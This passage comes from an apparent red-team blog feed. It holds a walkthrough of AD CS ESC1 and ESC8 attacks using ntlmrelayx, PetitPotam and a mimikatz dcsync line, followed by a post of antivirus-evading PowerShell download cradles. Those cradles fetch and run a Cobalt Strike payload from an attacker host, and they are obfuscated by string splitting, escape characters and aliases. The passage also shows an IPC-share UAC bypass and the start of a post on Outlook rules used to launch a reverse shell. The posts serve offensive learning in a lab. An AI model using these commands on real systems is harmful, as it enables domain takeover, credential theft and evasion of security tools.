src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103919750.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103942267.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813103951717.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813104034198.png"></p><h3 id="搭建完效果如下"><a href="#搭建完效果如下" class="headerlink" title="搭建完效果如下"></a>搭建完效果如下</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813105753003.png"></p><h3 id="辅助域控搭建"><a href="#辅助域控搭建" class="headerlink" title="辅助域控搭建"></a>辅助域控搭建</h3><pre class="line-numbers language-none"><code class="language-none">这里是把adcs搭成了辅助域控<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813155635888.png"><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813155651462.png"></p><pre class="line-numbers language-none"><code class="language-none">配置如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813155758040.png"></p><pre class="line-numbers language-none"><code class="language-none">主从复制<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210813155758040.png"></p><pre class="line-numbers language-none"><code class="language-none">一步步直接操作即可，按照提示完成相关的操作即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172343449.png"></p><h2 id="证书颁发机构信息获取"><a href="#证书颁发机构信息获取" class="headerlink" title="证书颁发机构信息获取"></a>证书颁发机构信息获取</h2><h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><pre class="line-numbers language-none"><code class="language-none">域内成员可成功定位到ca<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172332440.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172322940.png"></p><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">获得ca名称<span class="token punctuation">(</span><span class="token function">Get-ItemProperty</span> <span class="token operator">-</span>Path <span class="token string">"HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Active更多细节信息<span class="token variable">$CAName</span> = <span class="token punctuation">(</span><span class="token function">Get-ItemProperty</span> <span class="token operator">-</span>Path <span class="token string">"HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Active<span class="token punctuation">;</span><span class="token function">Get-Itemproperty</span> <span class="token operator">-</span>Path “HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<span class="token variable">$CAName</span>”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172313339.png"></p><h3 id="测试联通性"><a href="#测试联通性" class="headerlink" title="测试联通性"></a>测试联通性</h3><pre class="line-numbers language-none"><code class="language-none">确认NTLM协议（后面中继要用）curl http:&#x2F;&#x2F;192.168.3.73&#x2F;certsrv -I<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172301814.png"></p><h2 id="ESC1"><a href="#ESC1" class="headerlink" title="ESC1"></a>ESC1</h2><pre class="line-numbers language-none"><code class="language-none">个人原因，ESC1在部署的另外一套环境测试，也是同样的上方部署方式即可这里其实是有些坑点的，此处万分感谢李木师傅的解答~~~~<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><pre class="line-numbers language-none"><code class="language-none">攻击者可以在证书服务请求中指定主体名称，则请求者可以请求任何人（域管）的证书<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="配置问题"><a href="#配置问题" class="headerlink" title="配置问题"></a>配置问题</h3><pre class="line-numbers language-none"><code class="language-none">进入证书模板配置<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172252110.png"></p><pre class="line-numbers language-none"><code class="language-none">如下进行配置（存在客户端身份验证就行）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172242388.png"></p><pre class="line-numbers language-none"><code class="language-none">允许注册<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172230565.png"></p><pre class="line-numbers language-none"><code class="language-none">如下配置在请求中提供<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172222795.png"></p><pre class="line-numbers language-none"><code class="language-none">建议拷贝个模板出来做实验!!!如此将允许低权限用户使用任意SAN请求证书，从而允许低权限用户通过kerberos或schannel作为域中任何主体进行身份验证若允许这些设置的已发布证书模板，攻击者可以作为环境中的任何人请求证书，使用该证书为用户获取TGT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">使用漏洞发布者的工具即可域机器运行后如下，显示存在ESC1漏洞CA                      : yangdc.yangsir.git\yangsir-YANGDC-CAName                    : 用户 的副本SchemaVersion           : 2OID                     : 1.3.6.1.4.1.311.21.8.10154165.557338.9848748.4027908.13133259.250.6500742.4833607VulnerableTemplateACL   : FalseLowPrivCanEnroll        : TrueEnrolleeSuppliesSubject : TrueEnhancedKeyUsage        : 客户端身份验证 (1.3.6.1.5.5.7.3.2)|安全电子邮件 (1.3.6.1.5.5.7.3.4)|加密文件系统 (1.3.6.1.4.1.311.10.3.4)HasAuthenticationEku    : TrueHasDangerousEku         : FalseEnrollmentAgentTemplate : FalseCAManagerApproval       : FalseIssuanceRequirements    : [Issuance Requirements]                            Authorized signature count: 0                            Reenrollment requires: same criteria as for enrollment.ValidityPeriod          : 1 yearsRenewalPeriod           : 6 weeksOwner                   : YANGSIR\AdministratorDACL                    : NT AUTHORITY\Authenticated Users (Allow) - Read, Enroll                          YANGSIR\Administrator (Allow) - Read, Write                          YANGSIR\Domain Admins (Allow) - Read, Write, Enroll                          YANGSIR\Domain Users (Allow) - Enroll                          YANGSIR\Enterprise Admins (Allow) - Read, Write, EnrollMisconfigurations       : ESC1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172202595.png"></p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">通过普通域用户申请证书，注意UPN需要为域管<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172150232.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172140403.png"></p><pre class="line-numbers language-none"><code class="language-none">确认申请成功如下，为administrator权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172131605.png"></p><pre class="line-numbers language-none"><code class="language-none">确认使用者信息如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172123019.png"></p><pre class="line-numbers language-none"><code class="language-none">导出证书certutil -user -exportPFX sha1 yangsirdomainuser.pfx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172115476.png"></p><pre class="line-numbers language-none"><code class="language-none">此处通过凭证进行PTT出现失败，后推测可能是时间同步的问题<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172050369.png"></p><pre class="line-numbers language-none"><code class="language-none">对机器重启后，再次PTT即可成功，使用先前导出的凭证<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815172024825.png"></p><pre class="line-numbers language-none"><code class="language-none">确认凭证信息如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815171956871.png"></p><pre class="line-numbers language-none"><code class="language-none">确认可成功获取权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210815171943256.png"></p><h2 id="ESC8"><a href="#ESC8" class="headerlink" title="ESC8"></a>ESC8</h2><h3 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a>攻击方式</h3><pre class="line-numbers language-none"><code class="language-none">网上很多了，PetitPotam进行NTLM中继到域管在ADCS下通过管理员可选择安装的附加服务器角色支持多种基于HTTP的注册方法，如证书注册服务通过安装证书注册web服务，通过安装证书注册策略web服务角色&amp;证书注册策略web协同工作，然而此类http证书的注册接口都非常容易遭受NTLM中继使用NTLM中继，可以实现冒用目标用户，从而访问这些web页面，并根据用户和机器证书模板请求客户端身份验证码证书默认情况下，证书注册服务、证书注册策略web服务、网络设备注册服务通过授权http头支持协商身份验证，支持kerberos及NTLM。所以攻击者可以在中继攻击时获得NTLM身份验证虚拟性默认情况下，不会启用https，但是https本身不能抵抗NTLM中继！！！只有当https&amp;通道绑定相结合的时候，才能保护HTTPS服务免遭NTLM中继，ADCS没有为IIS上的身份验证启用扩展保护，并不能启用通道绑定！！！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210816194325538.png"></p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">这里要用的是impacket下的ntlmrelayx开启监听python3 ntlmrelayx.py -t http://192.168.3.73/certsrv/certfnsh.asp -smb2support --adcs --template <span class="token string">'DomainController'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210816195928550.png"></p><pre class="line-numbers language-none"><code class="language-none">PetitPotam强制用户进行身份验证PetitPotam.exe  192.168.3.11  192.168.3.144 [监听ip、目标服务ip]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210816200115491.png"></p><pre class="line-numbers language-none"><code class="language-none">获得凭证信息如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210816200142115.png"></p><pre class="line-numbers language-none"><code class="language-none">rubeus进行ptt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210816200335385.png"></p><pre class="line-numbers language-none"><code class="language-none">凭证已经获取，可以直接冲dcsynclsadump::dcsync &#x2F;domain:rootkit.org  &#x2F;all &#x2F;csv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210816200719283.png"></p><pre class="line-numbers language-none"><code class="language-none">wmic执行命令即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ADCS%26ESC1%26ESC8Attack/image-20210816201949460.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Domain Environment </tag>
            
            <tag> PTT </tag>
            
            <tag> DPE </tag>
            
            <tag> ADCS </tag>
            
            <tag> ESC1 </tag>
            
            <tag> ESC8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Powershell bypass tips</title>
      <link href="2021/08/11/powershell-bypass-tips/"/>
      <url>2021/08/11/powershell-bypass-tips/</url>
      
        <content type="html"><![CDATA[<h2 id="Command-EXEC"><a href="#Command-EXEC" class="headerlink" title="Command EXEC"></a>Command EXEC</h2><pre class="line-numbers language-none"><code class="language-none">String Add the &amp;&amp;“hostname”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20tips/image-20210810164359366.png"></p><pre class="line-numbers language-none"><code class="language-none">IEX()、Invoke-Expression() command execIEX(&quot;whoami&quot;)Invoke-Expression(&quot;whoami&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20tips/image-20210810164539173.png"></p><h2 id="Cobaltstrike-Online"><a href="#Cobaltstrike-Online" class="headerlink" title="Cobaltstrike Online"></a>Cobaltstrike Online</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">The default payload like thispowershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>nop <span class="token operator">-</span>w hidden <span class="token operator">-</span>c <span class="token string">"IEX ((new-object net.webclient).downloadstring('http://192.168.159.6:6379/yangsir'))"</span>Must be <span class="token function">kill</span> By AV<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20tips/image-20210811131954127.png"></p><h3 id="How-to-bypass"><a href="#How-to-bypass" class="headerlink" title="How to bypass"></a>How to bypass</h3><h4 id="The-string-Split"><a href="#The-string-Split" class="headerlink" title="The string Split"></a>The string Split</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">new-object</span> net<span class="token punctuation">.</span>webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>downloadstring<span class="token punctuation">(</span><span class="token string">'http://192.168.159.6:6379/yangsir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>‘new<span class="token operator">-</span>’<span class="token operator">+</span>‘object’ net<span class="token punctuation">.</span>webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>‘downl’<span class="token operator">+</span>‘oadstring’<span class="token punctuation">(</span><span class="token string">'http://192.168.159.6:6379/yangsir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="Substitution-variable"><a href="#Substitution-variable" class="headerlink" title="Substitution variable"></a>Substitution variable</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">Default payloadpowershell<span class="token punctuation">.</span>exe ”<span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">new-object</span> net<span class="token punctuation">.</span>webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>downloadstring<span class="token punctuation">(</span><span class="token string">'http://192.168.159.6:6379/yangsir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>“replace forward <span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">new-object</span> net<span class="token punctuation">.</span>webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>downloadstring<span class="token punctuation">(</span><span class="token string">'http://192.168.159.6:6379/yangsir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>after <span class="token function">IEX</span><span class="token variable">$test</span>=<span class="token function">new-object</span> net<span class="token punctuation">.</span>webclient<span class="token punctuation">;</span> <span class="token variable">$test</span><span class="token punctuation">.</span>downloadstring<span class="token punctuation">(</span><span class="token string">'http://192.168.159.6:6379/yangsir'</span><span class="token punctuation">)</span>like this to split the http string<span class="token variable">$a</span>=<span class="token string">'IEX((new-object net.webclient).downloadstring(''ht'</span><span class="token punctuation">;</span><span class="token variable">$b</span>=<span class="token string">'tp://192.168.159.6:6379/yangsir'</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Add-an-escape-character"><a href="#Add-an-escape-character" class="headerlink" title="Add an escape character"></a>Add an escape character</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>nop <span class="token operator">-</span>w hidden <span class="token operator">-</span>c <span class="token string">"IEX ((new-object net.webclient).d`own`load`st`ring('http://192.168.159.6:6379/yangsir'))"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Combined-use"><a href="#Combined-use" class="headerlink" title="Combined use"></a>Combined use</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">Very easy to use<span class="token punctuation">,</span> but like this payload must be <span class="token function">kill</span> againpowershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>nop <span class="token operator">-</span>w hidden <span class="token operator">-</span>c <span class="token string">"<span class="token variable">$t1</span>='IEX(New-Object Net.W';<span class="token variable">$t2</span>='ebClient).Downlo';<span class="token variable">$t3</span>='t4('http://192.168.159.6:6379/yangsir'')'.Replace('t4','adString');IEX(<span class="token variable">$t1</span>+<span class="token variable">$t2</span>+<span class="token variable">$t3</span>)"</span>powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>nop <span class="token operator">-</span>w hidden <span class="token operator">-</span>c <span class="token string">"<span class="token variable">$t1</span>='IEX ((new-object net.webclient).downl';<span class="token variable">$t2</span>='oadstring(''http://192.168.159.6:6379/yangsir''))';<span class="token variable">$t3</span>='<span class="token variable">$t1</span>,<span class="token variable">$t2</span>';IEX(-join <span class="token variable">$t3</span>)"</span>powershell<span class="token punctuation">.</span>exe <span class="token variable">$t1</span>=<span class="token string">'IEX(New-Object Net.W'</span><span class="token punctuation">;</span><span class="token variable">$t2</span>=<span class="token string">'ebClient).Downlo'</span><span class="token punctuation">;</span><span class="token variable">$t3</span>=<span class="token string">'t4('</span>http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>159<span class="token punctuation">.</span>6:6379<span class="token operator">/</span>yangsir<span class="token string">''</span><span class="token punctuation">)</span><span class="token string">'.Replace('</span>t4<span class="token string">','</span>adString<span class="token string">');IEX($t1+$t2+$t3)powershell.exe $t1='</span><span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">new-object</span> net<span class="token punctuation">.</span>webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>downl<span class="token string">';$t2='</span>oadstring<span class="token punctuation">(</span><span class="token string">''</span>http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>159<span class="token punctuation">.</span>6:6379<span class="token operator">/</span>yangsir<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token string">';$t3='</span><span class="token variable">$t1</span><span class="token punctuation">,</span><span class="token variable">$t2</span>'<span class="token punctuation">;</span><span class="token function">IEX</span><span class="token punctuation">(</span><span class="token operator">-join</span> <span class="token variable">$t3</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Use-alias"><a href="#Use-alias" class="headerlink" title="Use alias"></a>Use alias</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">BypassAVpowershell<span class="token punctuation">.</span>exe <span class="token function">set-alias</span> <span class="token operator">-</span>name test <span class="token operator">-</span>value <span class="token function">Invoke-Expression</span><span class="token punctuation">;</span>test<span class="token punctuation">(</span><span class="token function">New-Object</span> Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'http://192.168.159.6:6379/yangsir'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20tips/image-20210811144222680.png"></p><h5 id="Another"><a href="#Another" class="headerlink" title="Another"></a>Another</h5><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell<span class="token punctuation">.</span>exe <span class="token function">set-alias</span> <span class="token operator">-</span>name name1 <span class="token operator">-</span>value <span class="token function">Invoke-Expression</span><span class="token punctuation">;</span><span class="token string">"<span class="token variable">$t1</span>='name1((new-object net.webclient).downl';<span class="token variable">$t2</span>='oannn(''http://192.168.159.6:6379/yangsir''))'.Replace('nnn','dString');<span class="token variable">$t3</span>=<span class="token variable">$t1</span>,<span class="token variable">$t2</span>;<span class="token variable">$tfin</span>=<span class="token variable">$t3</span>;name1(-join <span class="token variable">$tfin</span>)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20tips/image-20210811151247591.png"></p><h4 id="Copy-PS-exec"><a href="#Copy-PS-exec" class="headerlink" title="Copy PS exec"></a>Copy PS exec</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">copy</span> C:\Windows\System32\WindowsPowerShell\v1<span class="token punctuation">.</span>0\powershell<span class="token punctuation">.</span>exe whoami<span class="token punctuation">.</span>txtwhoami<span class="token punctuation">.</span>txt <span class="token function">set-alias</span> <span class="token operator">-</span>name name1 <span class="token operator">-</span>value <span class="token function">Invoke-Expression</span><span class="token punctuation">;</span><span class="token string">"<span class="token variable">$t1</span>='name1((new-object net.webclient).downl';<span class="token variable">$t2</span>='oannn(''http://192.168.159.6:6379/yangsir''))'.Replace('nnn','dString');<span class="token variable">$t3</span>=<span class="token variable">$t1</span>,<span class="token variable">$t2</span>;<span class="token variable">$tfin</span>=<span class="token variable">$t3</span>;name1(-join <span class="token variable">$tfin</span>)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20tips/image-20210811151557751.png"></p><h4 id="Too-long-command"><a href="#Too-long-command" class="headerlink" title="Too long command"></a>Too long command</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Powershell%20bypass%20tips/image-20210811151807654.png"></p><pre class="line-numbers language-none"><code class="language-none">Also you can use the too long command + copyPS + confusion to Combined use<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> RCE </tag>
            
            <tag> Powershell </tag>
            
            <tag> Cobaltstrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Use IPC BypassUAC</title>
      <link href="2021/08/08/use-ipc-bypassuac/"/>
      <url>2021/08/08/use-ipc-bypassuac/</url>
      
        <content type="html"><![CDATA[<h6 id="After-the-actual-test-some-environments-can-be-successful"><a href="#After-the-actual-test-some-environments-can-be-successful" class="headerlink" title="After the actual test, some environments can be successful"></a>After the actual test, some environments can be successful</h6><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">In many scenarios<span class="token punctuation">,</span> you <span class="token keyword">do</span> not have <span class="token function">write</span> permission to the system directory<span class="token punctuation">.</span> Here you will use this method to obtain <span class="token function">write</span> permission to the fileC:\Windows\System32>net use A: \\127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1\c$命令成功完成。C:\Windows\System32>A:A:\>cd Windows\System32A:\Windows\System32><span class="token function">echo</span> test >test111A:\Windows\System32><span class="token function">dir</span> test111 驱动器 A 中的卷没有标签。 卷的序列号是 4C43<span class="token operator">-</span>ED5B A:\Windows\System32 的目录2021<span class="token operator">/</span>08<span class="token operator">/</span>08  15:01                 7 test111               1 个文件              7 字节               0 个目录 31<span class="token punctuation">,</span>098<span class="token punctuation">,</span>544<span class="token punctuation">,</span>128 可用字节A:\Windows\System32><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Use%20IPC%20BypassUAC/image-20210808150507232.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> UAC </tag>
            
            <tag> IPC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Attack the Outlook client</title>
      <link href="2021/08/04/attack-the-outlook-client/"/>
      <url>2021/08/04/attack-the-outlook-client/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">Outlook is a special software for email management in Office software. Exchange users can use Outlook to manage emails. It is also one of the most widely used Office software. Outlook is very powerful, some of the legitimate functions due to its particularity, when some of the attacker&#39;s tactics can often achieve unexpected results<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Rules-and-Notices"><a href="#Rules-and-Notices" class="headerlink" title="Rules and Notices"></a>Rules and Notices</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><pre class="line-numbers language-none"><code class="language-none">The rules and notification functions can be used to set policies for email receiving and sending, including rule conditions and actions. When certain conditions are met, a specified action is triggered, such as managing emails or even starting programs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Attack%20the%20Outlook%20client/image-20210803152344733.png"></p><pre class="line-numbers language-none"><code class="language-none">When you get a password for an email account, you can use that password to add rules that allow the target to execute special commands, such as bounce shell, when it receives a particular messageNote that the user needs to open outlook to activate the command. It cannot be triggered without outlook. However, if the owa is opened and the outlook is opened, the command can also be triggered<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h3><pre class="line-numbers language-none"><code class="language-none">The new rule is as follows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Attack%20the%20Outlook%20client/image-20210803152917869.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Attack%20the%20Outlook%20client/image-20210803152935119.png"></p><pre 